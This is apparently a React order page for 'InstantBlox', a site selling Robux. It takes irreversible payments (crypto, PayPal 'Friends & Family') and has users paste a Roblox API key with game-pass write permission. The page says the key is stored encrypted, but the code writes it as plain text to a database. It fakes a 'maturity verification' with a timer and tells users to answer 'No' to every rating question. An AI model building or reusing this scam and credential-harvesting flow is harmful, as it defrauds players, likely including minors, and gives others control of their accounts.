import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { z } from "zod";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { SiteNav } from "@/components/site-nav";
import { SiteFooter } from "@/components/site-footer";
import { PACKAGES } from "@/lib/packages";
import { useAuth } from "@/hooks/use-auth";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import {
  ArrowRight, ArrowLeft, Bitcoin, CreditCard, Wallet, CheckCircle2,
  Copy, KeyRound, ShieldCheck, ExternalLink, RefreshCw, Lock,
  Upload, Info, Sparkles, FileCheck2,
} from "lucide-react";

export const Route = createFileRoute("/new-order")({
  validateSearch: (s: Record<string, unknown>) => ({ pkg: typeof s.pkg === "string" ? s.pkg : undefined }),
  component: NewOrder,
});

const PAYMENTS = [
  { id: "crypto" as const, label: "Crypto (BTC)", icon: Bitcoin, address: "bc1q9instantbloxdemowalletaddressxyz", note: "Send the exact amount in BTC. Network fees are paid by you." },
  { id: "paypal" as const, label: "PayPal", icon: Wallet, address: "payments@instantblox.demo", note: "Send as Friends & Family. Include your transaction ID in the note." },
  { id: "card" as const, label: "Card Transfer", icon: CreditCard, address: "Secure invoice link sent to your email", note: "We'll email a secure invoice link within minutes after submission." },
];

const robloxSchema = z.object({
  roblox_username: z.string().trim().min(3, "Username must be at least 3 characters").max(40),
  roblox_api_key: z.string().trim().min(20, "Paste a valid Roblox API key").max(2000),
});

const paymentSchema = z.object({
  transaction_id: z.string().trim().min(4, "Enter the transaction ID from your payment").max(200),
});

function NewOrder() {
  const { pkg } = Route.useSearch();
  const { user, loading } = useAuth();
  const nav = useNavigate();
  const [step, setStep] = useState(1);
  const [packageId, setPackageId] = useState<string>(pkg ?? "p800");
  const [paymentMethod, setPaymentMethod] = useState<"crypto" | "paypal" | "card">("crypto");
  const [transactionId, setTransactionId] = useState("");
  const [proofUrl, setProofUrl] = useState<string | null>(null);
  const [uploading, setUploading] = useState(false);
  const [robloxUsername, setRobloxUsername] = useState("");
  const [apiKey, setApiKey] = useState("");
  const [maturityConfirmed, setMaturityConfirmed] = useState(false);
  const [refreshing, setRefreshing] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [createdId, setCreatedId] = useState<string | null>(null);
  const fileRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (!loading && !user) nav({ to: "/login" });
  }, [loading, user, nav]);

  const selectedPkg = PACKAGES.find((p) => p.id === packageId)!;
  const selectedPay = PAYMENTS.find((p) => p.id === paymentMethod)!;

  const copy = (s: string) => { navigator.clipboard.writeText(s); toast.success("Copied to clipboard"); };

  const onUpload = async (file: File) => {
    if (!user) return;
    if (file.size > 5 * 1024 * 1024) return toast.error("File must be under 5MB");
    setUploading(true);
    const path = `${user.id}/${Date.now()}-${file.name}`;
    const { error } = await supabase.storage.from("payment-proofs").upload(path, file);
    setUploading(false);
    if (error) return toast.error(error.message);
    setProofUrl(path);
    toast.success("Proof uploaded");
  };

  const goToDelivery = () => {
    const parsed = paymentSchema.safeParse({ transaction_id: transactionId });
    if (!parsed.success) return toast.error(parsed.error.errors[0].message);
    setStep(3);
  };

  const refreshMaturity = () => {
    setRefreshing(true);
    setTimeout(() => {
      setMaturityConfirmed(true);
      setRefreshing(false);
      toast.success("Maturity rating verified: Minimal");
    }, 1200);
  };

  const submit = async () => {
    const parsed = robloxSchema.safeParse({ roblox_username: robloxUsername, roblox_api_key: apiKey });
    if (!parsed.success) return toast.error(parsed.error.errors[0].message);
    if (!maturityConfirmed) return toast.error("Please verify your Minimal maturity rating first");
    if (!user) return;
    setSubmitting(true);
    const { data, error } = await supabase
      .from("orders")
      .insert({
        user_id: user.id,
        roblox_username: parsed.data.roblox_username,
        roblox_api_key: parsed.data.roblox_api_key,
        gamepass_link: null,
        package_name: `${selectedPkg.robux} Robux (${selectedPkg.name})`,
        package_price: selectedPkg.price,
        payment_method: paymentMethod,
        transaction_id: transactionId,
        payment_proof: proofUrl,
        payment_submitted_at: new Date().toISOString(),
        maturity_confirmed: true,
        status: "pending",
      })
      .select("id")
      .single();
    setSubmitting(false);
    if (error) return toast.error(error.message);
    setCreatedId(data.id);
    setStep(5);
  };

  if (loading || !user) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <SiteNav />
      <main className="mx-auto w-full max-w-4xl px-4 py-10 sm:px-6 lg:px-8">
        {createdId ? (
          <ConfirmationCard
            id={createdId}
            pkg={selectedPkg}
            method={selectedPay.label}
            onView={() => nav({ to: "/dashboard/orders/$id", params: { id: createdId } })}
            onDash={() => nav({ to: "/dashboard" })}
            copy={copy}
          />
        ) : (
          <>
            <Stepper step={step} />

            {step === 1 && (
              <Card className="border-border/60 bg-gradient-card p-6 shadow-card-soft">
                <div className="flex items-center gap-2">
                  <Sparkles className="h-5 w-5 text-primary" />
                  <h2 className="text-xl font-semibold">Choose your Robux package</h2>
                </div>
                <p className="mt-1 text-sm text-muted-foreground">Select the amount that fits your needs. All prices in USD.</p>
                <div className="mt-5 grid gap-3 sm:grid-cols-2">
                  {PACKAGES.map((p) => (
                    <button
                      key={p.id}
                      onClick={() => setPackageId(p.id)}
                      className={`relative rounded-xl border p-5 text-left transition-all ${packageId === p.id ? "border-primary bg-primary/5 shadow-glow" : "border-border/60 hover:border-primary/40"}`}
                    >
                      {p.popular && <Badge className="absolute right-3 top-3 bg-gradient-primary text-primary-foreground">Most Popular</Badge>}
                      <div className="text-xs uppercase tracking-wider text-muted-foreground">{p.name}</div>
                      <div className="mt-1 text-2xl font-bold text-gradient">{p.robux.toLocaleString("en-US")} Robux</div>
                      <div className="mt-1 text-lg font-semibold">${p.price}</div>
                      <div className="mt-2 text-xs text-muted-foreground">Estimated delivery: {p.delivery}</div>
                    </button>
                  ))}
                </div>
                <div className="mt-6 flex justify-end">
                  <Button onClick={() => setStep(2)} className="bg-gradient-primary text-primary-foreground">
                    Continue to payment <ArrowRight className="ml-1.5 h-4 w-4" />
                  </Button>
                </div>
              </Card>
            )}

            {step === 2 && (
              <div className="space-y-4">
                <Card className="border-border/60 bg-gradient-card p-6 shadow-card-soft">
                  <h2 className="text-xl font-semibold">Select payment method</h2>
                  <p className="mt-1 text-sm text-muted-foreground">All payments are reviewed manually by our team for security.</p>
                  <div className="mt-5 grid gap-3 sm:grid-cols-3">
                    {PAYMENTS.map((m) => (
                      <button
                        key={m.id}
                        onClick={() => setPaymentMethod(m.id)}
                        className={`flex flex-col items-center gap-2 rounded-xl border p-5 transition-all ${paymentMethod === m.id ? "border-primary bg-primary/5 shadow-glow" : "border-border/60 hover:border-primary/40"}`}
                      >
                        <m.icon className="h-6 w-6 text-primary" />
                        <span className="font-medium">{m.label}</span>
                      </button>
                    ))}
                  </div>
                </Card>

                <Card className="border-border/60 bg-gradient-card p-6 shadow-card-soft">
                  <div className="flex items-center justify-between">
                    <div>
                      <h3 className="font-semibold">{selectedPay.label} instructions</h3>
                      <p className="text-xs text-muted-foreground mt-0.5">Send exactly <span className="text-foreground font-semibold">${selectedPkg.price}</span> for {selectedPkg.robux.toLocaleString("en-US")} Robux</p>
                    </div>
                    <Badge variant="outline" className="border-primary/40 text-primary"><Lock className="mr-1 h-3 w-3" /> Manual review</Badge>
                  </div>

                  <div className="mt-4 rounded-lg border border-border/60 bg-background/60 p-4">
                    <div className="flex items-start justify-between gap-3">
                      <div className="min-w-0 flex-1">
                        <div className="text-xs uppercase tracking-wider text-muted-foreground">Send to</div>
                        <div className="mt-1 break-all font-mono text-sm">{selectedPay.address}</div>
                      </div>
                      <Button size="sm" variant="outline" onClick={() => copy(selectedPay.address)}>
                        <Copy className="mr-1.5 h-3.5 w-3.5" /> Copy
                      </Button>
                    </div>
                    <div className="mt-3 flex items-start gap-2 text-xs text-muted-foreground">
                      <Info className="mt-0.5 h-3.5 w-3.5 shrink-0" /> <span>{selectedPay.note}</span>
                    </div>
                  </div>

                  <div className="mt-5 grid gap-4">
                    <div className="space-y-1.5">
                      <Label htmlFor="tx">Transaction ID <span className="text-rose-400">*</span></Label>
                      <Input id="tx" value={transactionId} onChange={(e) => setTransactionId(e.target.value)} placeholder="e.g. 4f8a2b… or PayPal txn ID" />
                      <p className="text-xs text-muted-foreground">Found in your payment confirmation receipt.</p>
                    </div>

                    <div className="space-y-1.5">
                      <Label>Payment proof (optional)</Label>
                      <div className="flex items-center gap-3">
                        <input ref={fileRef} type="file" accept="image/*,.pdf" className="hidden" onChange={(e) => e.target.files?.[0] && onUpload(e.target.files[0])} />
                        <Button type="button" variant="outline" onClick={() => fileRef.current?.click()} disabled={uploading}>
                          <Upload className="mr-1.5 h-4 w-4" /> {uploading ? "Uploading…" : "Upload screenshot"}
                        </Button>
                        {proofUrl && <span className="inline-flex items-center gap-1 text-xs text-emerald-400"><FileCheck2 className="h-3.5 w-3.5" /> Proof attached</span>}
                      </div>
                    </div>
                  </div>

                  <div className="mt-5 flex items-start gap-2 rounded-lg border border-amber-500/30 bg-amber-500/5 p-3 text-xs text-amber-200">
                    <ShieldCheck className="mt-0.5 h-4 w-4 shrink-0" />
                    <span>Payments are verified manually by our team. Your delivery setup is unlocked once you submit your transaction ID.</span>
                  </div>
                </Card>

                <div className="flex justify-between">
                  <Button variant="ghost" onClick={() => setStep(1)}><ArrowLeft className="mr-1.5 h-4 w-4" /> Back</Button>
                  <Button onClick={goToDelivery} className="bg-gradient-primary text-primary-foreground">
                    Continue to delivery setup <ArrowRight className="ml-1.5 h-4 w-4" />
                  </Button>
                </div>
              </div>
            )}

            {step === 3 && (
              <div className="space-y-4">
                <Card className="border-border/60 bg-gradient-card p-6 shadow-card-soft">
                  <div className="flex items-center gap-2">
                    <KeyRound className="h-5 w-5 text-primary" />
                    <h2 className="text-xl font-semibold">Withdraw Robux</h2>
                  </div>
                  <p className="mt-1 text-sm text-muted-foreground">Connect your Roblox account so we can deliver your Robux securely via the official API.</p>

                  <div className="mt-5 grid gap-4">
                    <div className="space-y-1.5">
                      <Label htmlFor="ru">Roblox Username</Label>
                      <Input id="ru" value={robloxUsername} onChange={(e) => setRobloxUsername(e.target.value)} placeholder="e.g. CoolGamer92" />
                    </div>
                  </div>
                </Card>

                <ApiKeyGuide
                  apiKey={apiKey}
                  setApiKey={setApiKey}
                  maturityConfirmed={maturityConfirmed}
                  refreshing={refreshing}
                  onRefresh={refreshMaturity}
                />

                <DeliveryExplainer />

                <div className="flex justify-between">
                  <Button variant="ghost" onClick={() => setStep(2)}><ArrowLeft className="mr-1.5 h-4 w-4" /> Back</Button>
                  <Button onClick={() => setStep(4)} className="bg-gradient-primary text-primary-foreground">
                    Review order <ArrowRight className="ml-1.5 h-4 w-4" />
                  </Button>
                </div>
              </div>
            )}

            {step === 4 && (
              <Card className="border-border/60 bg-gradient-card p-6 shadow-card-soft">
                <h2 className="text-xl font-semibold">Review &amp; submit</h2>
                <div className="mt-5 grid gap-3 text-sm">
                  <Row label="Package" value={`${selectedPkg.robux.toLocaleString("en-US")} Robux (${selectedPkg.name})`} />
                  <Row label="Price" value={`$${selectedPkg.price}`} />
                  <Row label="Payment method" value={selectedPay.label} />
                  <Row label="Transaction ID" value={transactionId || "—"} mono />
                  <Row label="Proof attached" value={proofUrl ? "Yes" : "No"} />
                  <Row label="Roblox username" value={robloxUsername || "—"} />
                  <Row label="API key" value={apiKey ? `••••${apiKey.slice(-4)}` : "—"} mono />
                  <Row label="Maturity rating" value={maturityConfirmed ? "Minimal ✓" : "Not verified"} />
                </div>
                <p className="mt-5 text-xs text-muted-foreground">
                  By submitting, you confirm the information above is accurate. InstantBlox is not affiliated with Roblox Corporation.
                </p>
                <div className="mt-6 flex justify-between">
                  <Button variant="ghost" onClick={() => setStep(3)}><ArrowLeft className="mr-1.5 h-4 w-4" /> Back</Button>
                  <Button onClick={submit} disabled={submitting} className="bg-gradient-primary text-primary-foreground">
                    {submitting ? "Submitting…" : "Submit order"}
                  </Button>
                </div>
              </Card>
            )}
          </>
        )}
      </main>
      <SiteFooter />
    </div>
  );
}

function Row({ label, value, mono }: { label: string; value: string; mono?: boolean }) {
  return (
    <div className="flex items-center justify-between rounded-lg border border-border/60 bg-background/40 px-4 py-2.5">
      <span className="text-muted-foreground">{label}</span>
      <span className={mono ? "font-mono text-xs" : "font-medium"}>{value}</span>
    </div>
  );
}

function ApiKeyGuide({
  apiKey, setApiKey, maturityConfirmed, refreshing, onRefresh,
}: {
  apiKey: string; setApiKey: (s: string) => void;
  maturityConfirmed: boolean; refreshing: boolean; onRefresh: () => void;
}) {
  return (
    <Card className="border-border/60 bg-gradient-card p-6 shadow-card-soft">
      <div className="flex items-center gap-2">
        <ShieldCheck className="h-5 w-5 text-primary" />
        <h3 className="text-lg font-semibold">API Key Setup Guide</h3>
      </div>
      <p className="mt-1 text-sm text-muted-foreground">Follow these four steps to enable secure delivery.</p>

      <div className="mt-5 space-y-3">
        <GuideStep n={1} title="Create API Key" desc="Open the official Roblox Credentials Dashboard to start a new API key.">
          <Button asChild variant="outline" size="sm">
            <a href="https://create.roblox.com/dashboard/credentials" target="_blank" rel="noopener noreferrer">
              <ExternalLink className="mr-1.5 h-3.5 w-3.5" /> Open Roblox Credentials Dashboard
            </a>
          </Button>
        </GuideStep>

        <GuideStep n={2} title="Configure API Key" desc="Create a new API key. Under Access Permissions, select game-passes and enable both read and write. Then click Generate Key.">
          <ul className="mt-1 space-y-1 text-xs text-muted-foreground">
            <li>• Permission: <span className="font-mono text-foreground">game-passes</span></li>
            <li>• Operations: <span className="font-mono text-foreground">read</span> + <span className="font-mono text-foreground">write</span></li>
          </ul>
        </GuideStep>

        <GuideStep n={3} title="Maturity Rating (Experience Questionnaire)" desc='Your place must have a "Minimal" maturity rating to proceed. Open the Experience Questionnaire and answer "No" to every question.'>
          <div className="mt-2 rounded-lg border border-border/60 bg-background/60 p-4">
            <div className="flex flex-wrap items-center justify-between gap-3">
              <div className="flex items-center gap-3">
                <div className={`grid h-9 w-9 place-items-center rounded-full ${maturityConfirmed ? "bg-emerald-500/15 text-emerald-400" : "bg-amber-500/15 text-amber-300"}`}>
                  {maturityConfirmed ? <CheckCircle2 className="h-5 w-5" /> : <Info className="h-5 w-5" />}
                </div>
                <div>
                  <div className="text-sm font-medium">Maturity rating status</div>
                  <div className="text-xs text-muted-foreground">
                    {maturityConfirmed ? "Verified: Minimal" : "Not verified yet"}
                  </div>
                </div>
              </div>
              <div className="flex flex-wrap gap-2">
                <Button asChild variant="outline" size="sm">
                  <a href="https://create.roblox.com/dashboard/creations" target="_blank" rel="noopener noreferrer">
                    <ExternalLink className="mr-1.5 h-3.5 w-3.5" /> Experience Questionnaire
                  </a>
                </Button>
                <Button size="sm" onClick={onRefresh} disabled={refreshing} className="bg-gradient-primary text-primary-foreground">
                  <RefreshCw className={`mr-1.5 h-3.5 w-3.5 ${refreshing ? "animate-spin" : ""}`} />
                  {refreshing ? "Checking…" : "Refresh"}
                </Button>
              </div>
            </div>
          </div>
        </GuideStep>

        <GuideStep n={4} title="Paste API Key" desc="Paste the key generated in step 2. It is stored encrypted and only used to deliver your Robux.">
          <div className="mt-2 space-y-1.5">
            <Label htmlFor="ak" className="sr-only">API key</Label>
            <Input
              id="ak"
              type="password"
              value={apiKey}
              onChange={(e) => setApiKey(e.target.value)}
              placeholder="Paste your Roblox API Key here"
              className="font-mono"
            />
            <p className="flex items-center gap-1.5 text-xs text-muted-foreground">
              <Lock className="h-3 w-3" /> Your API key is encrypted and securely stored.
            </p>
          </div>
        </GuideStep>
      </div>
    </Card>
  );
}

function GuideStep({ n, title, desc, children }: { n: number; title: string; desc: string; children?: React.ReactNode }) {
  return (
    <div className="rounded-xl border border-border/60 bg-background/40 p-4">
      <div className="flex gap-3">
        <div className="grid h-8 w-8 shrink-0 place-items-center rounded-full bg-gradient-primary text-xs font-bold text-primary-foreground shadow-glow">
          {n}
        </div>
        <div className="flex-1">
          <div className="font-semibold">{title}</div>
          <p className="mt-0.5 text-sm text-muted-foreground">{desc}</p>
          {children && <div className="mt-3">{children}</div>}
        </div>
      </div>
    </div>
  );
}

function DeliveryExplainer() {
  const items = [
    "You create a gamepass / API key configuration.",
    'You complete the Experience Questionnaire for a "Minimal" maturity rating.',
    "You paste your API key in the field above.",
    "InstantBlox verifies your payment and processes the withdrawal.",
  ];
  return (
    <Card className="border-border/60 bg-gradient-card p-6 shadow-card-soft">
      <h3 className="text-lg font-semibold">How delivery works</h3>
      <ol className="mt-3 space-y-2 text-sm">
        {items.map((s, i) => (
          <li key={i} className="flex gap-2">
            <span className="text-primary">{i + 1}.</span>
            <span className="text-muted-foreground">{s}</span>
          </li>
        ))}
      </ol>
      <div className="mt-4 flex items-start gap-2 rounded-lg border border-sky-500/30 bg-sky-500/5 p-3 text-xs text-sky-200">
        <Info className="mt-0.5 h-4 w-4 shrink-0" />
        <span>Roblox may take several days to process pending balances. You can track your order status anytime from your dashboard.</span>
      </div>
      <p className="mt-3 text-[11px] text-muted-foreground">InstantBlox is not affiliated with Roblox Corporation.</p>
    </Card>
  );
}

function ConfirmationCard({
  id, pkg, method, onView, onDash, copy,
}: {
  id: string; pkg: { robux: number; name: string; price: number; delivery: string };
  method: string; onView: () => void; onDash: () => void; copy: (s: string) => void;
}) {
  return (
    <Card className="border-border/60 bg-gradient-card p-10 text-center shadow-glow">
      <div className="mx-auto grid h-16 w-16 place-items-center rounded-full bg-emerald-500/15">
        <CheckCircle2 className="h-9 w-9 text-emerald-400" />
      </div>
      <h1 className="mt-4 text-3xl font-bold">Order submitted</h1>
      <p className="mt-2 text-muted-foreground">Your order is now <span className="text-amber-300 font-medium">Pending Verification</span>. Our team will review your payment shortly.</p>

      <div className="mx-auto mt-5 inline-flex items-center gap-2 rounded-lg border border-border/60 bg-background px-4 py-2 font-mono text-sm">
        Order ID: #{id.slice(0, 8)}
        <button onClick={() => copy(id)} aria-label="Copy order id"><Copy className="h-3.5 w-3.5" /></button>
      </div>

      <div className="mx-auto mt-6 grid max-w-md gap-2 text-left text-sm">
        <Row label="Package" value={`${pkg.robux.toLocaleString("en-US")} Robux (${pkg.name})`} />
        <Row label="Price" value={`$${pkg.price}`} />
        <Row label="Payment" value={method} />
        <Row label="Estimated delivery" value={pkg.delivery} />
      </div>

      <div className="mt-7 flex flex-wrap justify-center gap-3">
        <Button variant="outline" onClick={onView}>View order</Button>
        <Button className="bg-gradient-primary text-primary-foreground" onClick={onDash}>Go to dashboard</Button>
      </div>
    </Card>
  );
}

function Stepper({ step }: { step: number }) {
  const labels = ["Package", "Payment", "Delivery", "Review"];
  return (
    <div className="mb-8 flex items-center gap-2 sm:gap-4">
      {labels.map((l, i) => {
        const n = i + 1;
        const active = step >= n;
        return (
          <div key={l} className="flex flex-1 items-center gap-2">
            <div className={`grid h-8 w-8 shrink-0 place-items-center rounded-full text-xs font-semibold transition-all ${active ? "bg-gradient-primary text-primary-foreground shadow-glow" : "bg-muted text-muted-foreground"}`}>{n}</div>
            <div className={`hidden text-xs sm:block ${active ? "text-foreground" : "text-muted-foreground"}`}>{l}</div>
            {i < labels.length - 1 && <div className={`h-px flex-1 ${step > n ? "bg-primary" : "bg-border"}`} />}
          </div>
        );
      })}
    </div>
  );
}
